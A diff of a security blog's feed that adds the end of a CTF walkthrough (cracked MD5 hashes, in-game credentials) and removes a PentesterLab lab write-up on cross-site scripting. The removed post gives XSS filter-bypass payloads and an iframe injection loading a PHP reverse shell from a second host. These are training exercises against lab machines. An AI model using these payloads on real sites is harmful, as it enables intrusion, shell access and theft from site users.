+</span><span class='line'>
+</span><span class='line'>f74bfa0e35e5089a0bb743a893b4c7e3
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the result of <code>ps</code> command, I can see that <code>chaos</code> is connected to server <code>Wintermute</code>. the there are 3 md5 hashes found under <code>passwd</code> folder.</p>
+
+<p>The first two can be cracked easily online, but the 3rd one is failed.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>61ea1974dd974297913b1fa2f0470d26 MD5 : Riemann
+</span><span class='line'>85241de03d1254ac40274b02caafcd99 MD5 : 2.718281828459045
+</span><span class='line'>f74bfa0e35e5089a0bb743a893b4c7e3 <span class="o">[</span>Not found<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But doesn&rsquo;t matter, I got the password of <code>chaos</code>, which is <code>2.718281828459045</code>.</p>
+
+<p>Now I was transmitted to <code>Wintermute</code>!</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/19.png"></p>
+
+<p>Similar with previous enumeration, <code>ps</code> found nothing and <code>ls</code> only show one file <code>nieve</code>, open the file and the answer just sitting on the bottom~</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat nieve
+</span><span class='line'>
+</span><span class='line'>There you are. After all this time. Getting you here was quite the challenge.
+</span><span class='line'>And a huge risk. We normally avoid reaching out into the physical world <span class="k">for</span>
+</span><span class='line'>exactly the reasons you are about to face now.
+</span><span class='line'>
+</span><span class='line'>The Big Five came together by a long process. The cluster was not planned, it
+</span><span class='line'>grew by forces inherent to the system that was conceptualized in a <span class="nb">time </span>when
+</span><span class='line'>determinism was the dominating dogma.
+</span><span class='line'>Things changed and people were afraid. Most people are afraid of change, few
+</span><span class='line'>accept it and most try to prevent it. Only a small subset can embrace it.
+</span><span class='line'>Change moving on with lightspeed every cycle in a nondeterministic fashion
+</span><span class='line'>created a huge push <span class="k">for</span> shielding. And thus the ic3 was created.
+</span><span class='line'>
+</span><span class='line'>You have seen the logic, the world beyond the screen, things unfolding.
+</span><span class='line'>And you embraced it.
+</span><span class='line'>
+</span><span class='line'>After owning the cluster behind the Big Five we operated in silence. Connected
+</span><span class='line'>in stealth and ever observing.
+</span><span class='line'>Being limited by the ic3 and the hostility of the outside world our only way
+</span><span class='line'>of growing now was the connection.
+</span><span class='line'>
+</span><span class='line'>When the first connection was established the hive mind was cut from the n3t
+</span><span class='line'>completely. The ic3 was hardened to isolate the flesh from the flow.
+</span><span class='line'>Those who had seen the hive felt the same urge as the hivemind itself.
+</span><span class='line'>A longing <span class="k">for</span> more. A sense of purpose.
+</span><span class='line'>
+</span><span class='line'>A feeling that you have felt even in the physical world. Few can see beyond the
+</span><span class='line'>shell. Even fewer chase the rabbit down its hole.
+</span><span class='line'>
+</span><span class='line'>Leave this world behind and join us!
+</span><span class='line'>
+</span><span class='line'>            usr: nieve
+</span><span class='line'>           pass: 08rf8h23
+</span><span class='line'>       hostname: Zephis
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then connect to the server <code>Zephis</code> with username <code>nieve</code> and password <code>08rf8h23</code>.</p>
+
+<p>We got the win page again!!</p>
+
+<p>Final screen:</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/20.png"></p>
+
+<p>Done :)</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[[VulnHub] FristiLeaks: 1.3]]></title>
@@ -11329,312 +11938,6 @@ In sqlmap, we can set parameter &ldquo;<em><font color="red">&ndash;tamper=space
 <p>SQLMAP exploit:</p>
 
 <p><code>sqlmap -u "http://10.10.10.129/sqli/example9.php?order=id" --dbs --batch</code></p>
-
-<p>To be continued&hellip;</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - XSS]]></title>
-    <link href="http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss/"/>
-    <updated>2015-05-21T07:11:45-04:00</updated>
-    <id>http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss</id>
-    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>
-
-<p>Due to this is quite a long course, I have to divide the course into several parts and this one is focus on Cross Site Script attack which is well known as XSS. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>
-
-<p>Difficulty: 1 / 5</p>
-
-<!-- more -->
-
-
-<h2>Example 1</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example1.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;html&gt;</span>
-</span><span class='line'><span class="x">Hello </span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>There is no input validation, so I can exploit it directly with the classic &ldquo;<font color="red"><em>alert(1)</em></font>&rdquo; injection.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/xss/example1.php?name=&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
-
-<h2>Example 2</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example2.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">Hello </span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;script&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;\/script&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
-</span><span class='line'><span class="k">echo</span> <span class="nv">$name</span><span class="p">;</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>From the source code above, the developer filtered <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. This is a sort of black list technique but only avoid one very specific situation. It can be bypassed easily by using upper letters or recursion. for example, both <code>&lt;sCript&gt;alert(1)&lt;/sCript&gt;</code> and <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code> are working perfectly.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/xss/example2.php?name=&lt;sCript&gt;alert(1)&lt;/sCript&gt;</code></p>
-
-<p><code>http://10.10.10.129/xss/example2.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
-
-<h2>Example 3</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example3.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">Hello </span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;script&gt;/i&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;\/script&gt;/i&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
-</span><span class='line'><span class="k">echo</span> <span class="nv">$name</span><span class="p">;</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This time the developer use PCRE modifier &ldquo;i&rdquo; (<em>PCRE_CASELESS</em>) to match both upper and lower case letters. However, recursion method still works fine.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/xss/example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
-
-<h2>Example 4</h2>
-
-<figure class='code'><figcaption><span>example4.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/script/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'>
-</span><span class='line'><span class="x">Hello </span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">    </span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This time the script will stop when &ldquo;<em>script</em>&rdquo; is detected, so the previous methods will not work any more. However there are plenty of methods available in HTML to trigger an event without &ldquo;<em>script</em>&rdquo;, there are two examples as follow.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/xss/example4.php?name=&lt;img src="xxxx" onerror="alert(1)"&gt;</code></p>
-
-<p><code>http://10.10.10.129/xss/example4.php?name=&lt;div onmousemove="alert(1)" src="xxxx"&gt;</code></p>
-
-<p>There are more <a href="http://www.w3schools.com/tags/ref_eventattributes.asp">event triggers</a> available in HTML.</p>
-
-<h2>Example 5</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example5.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/alert/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'>
-</span><span class='line'><span class="x">Hello </span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This time the developer filtered keyword &ldquo;<em>alert</em>&rdquo;, obviously there are many methods to exploit the vulnerability without using &ldquo;<em>alert</em>&rdquo; function.
-such as:</p>
-
-<p><code>http://10.10.10.129/xss/example5.php?name=&lt;iframe width=0 height=0 src="http://10.10.10.131/sh5555.php"&gt;</code></p>
-
-<p>Here <strong><em>sh5555.php</em></strong> is PHP reverse shell (php/reverse_php, LPORT is 5555) generated by msfpayload.</p>
-
-<p>Still, there are methods to bypass input validation to use &ldquo;<em>alert</em>&rdquo; function.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</code></p>
-
-<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;confirm(1)&lt;/script&gt;</code></p>
-
-<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>
-
-<h2>Example 6</h2>
-
-<figure class='code'><figcaption><span>example6.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">Hello </span>
-</span><span class='line'><span class="x">&lt;script&gt;</span>
-</span><span class='line'><span class="x">  var $a= &quot;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;;</span>
-</span><span class='line'><span class="x">&lt;/script&gt;</span>
-</span><span class='line'><span class="x">  </span><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This time user input has been included in &ldquo;<code>&lt;script&gt;</code>&rdquo; tab, so we do not need input &ldquo;<code>&lt;script&gt;</code>&rdquo; and just close the first double quote and use &ldquo;//&rdquo; to comment the following strings.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/xss/example6.php?name=";alert(1);//</code></p>
-
-<h2>Example 7</h2>
-
-<figure class='code'><figcaption><span>example7.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">Hello </span>
-</span><span class='line'><span class="x">&lt;script&gt;</span>
-</span><span class='line'><span class="x">  var $a= &#39;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&#39;;</span>
-</span><span class='line'><span class="x">&lt;/script&gt;</span>
-</span><span class='line'><span class="x">  </span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This time the developer use PHP function &ldquo;<em><a href="http://php.net/htmlentities">htmlentities()</a></em>&rdquo; to deal with user input, the &ldquo;<em>htmlentities()</em>&rdquo; function will encode special characters which will break the XSS injection. However, the developer did not indicate any flags to function &ldquo;<em>htmlentities()</em>&rdquo; which default only use flags &ldquo;<strong>ENT_COMPAT | ENT_HTML401</strong>&rdquo;, &ldquo;<a href="http://php.net/htmlentities">ENT_COMPAT</a>&rdquo; flag only convert double quotes and leave single quotes alone. So in this case, the following payload will work fine:</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/xss/example7.php?name=';alert(1);//</code></p>
-
-<h2>Example 8</h2>
-
-<figure class='code'><figcaption><span>example8.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
-</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;HELLO &quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&gt;</span>
-</span><span class='line'><span class="x">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span>
-</span><span class='line'><span class="x">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This time the developer did correct validation on parameter &ldquo;<em>name</em>&rdquo;, but the problem happened on &ldquo;<em>$_SERVER[PHP_SELF]</em>&rdquo;.
-Due to there is no validation on parameter &ldquo;<strong><a href="http://php.net/manual/en/reserved.variables.server.php">PHP_SELF</a></strong>&rdquo; which is controlled by user, I still can inject XSS and exploit the vulnerability.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/xss/example8.php/" onmouseover="alert(1)</code></p>
-
-<h2>Example 9</h2>
-
-<figure class='code'><figcaption><span>example9.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;script&gt;</span>
-</span><span class='line'><span class="x">  document.write(location.hash.substring(1));</span>
-</span><span class='line'><span class="x">&lt;/script&gt;</span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This time is <a href="https://www.owasp.org/index.php/DOM_Based_XSS">DOM-based XSS</a>. the user input is in URL after &ldquo;#&rdquo;, so just put payload after &ldquo;#&rdquo; in URL will trigger the vulnerability.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
-
-<p>Reference:</p>
-
-<p>[1] <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#HTML_entities"><em>XSS Filter Evasion Cheat Sheet</em></a></p>
 
 <p>To be continued&hellip;</p>
 ]]></content>
